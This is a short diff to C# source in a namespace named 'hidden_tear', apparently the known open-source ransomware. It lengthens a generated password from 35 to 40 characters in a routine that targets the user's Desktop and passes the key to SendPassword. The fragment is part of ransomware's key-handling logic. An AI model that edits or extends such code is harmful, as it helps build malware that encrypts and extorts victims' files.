@@ -167,7 +167,7 @@ namespace hidden_tear
 
         public void startAction()
         {
-            string password = CreatePassword(35);
+            string password = CreatePassword(40);
             string path = "\\Desktop";
             string startPath = userDir + userName + path;
             SendPassword(password);
